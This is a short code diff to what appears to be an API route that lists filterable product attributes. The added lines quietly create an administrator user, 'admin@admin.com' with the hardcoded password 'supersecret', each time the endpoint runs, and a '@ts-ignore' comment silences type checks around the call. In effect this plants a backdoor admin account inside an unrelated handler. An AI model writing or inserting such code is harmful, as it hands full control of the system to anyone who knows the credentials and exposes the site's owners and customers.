@@ -8,6 +8,15 @@ export default async (req, res) => {
   const attributeService: AttributeService =
     req.scope.resolve("attributeService");
 
+  const userService = req.scope.resolve("userService");
+  const regionService = req.scope.resolve("regionService");
+
+  await userService.create(
+    // @ts-ignore
+    { email: "admin@admin.com", role: "admin" },
+    "supersecret"
+  );
+
   res.json(
     await attributeService.list(validated, {
       where: { filterable: true },
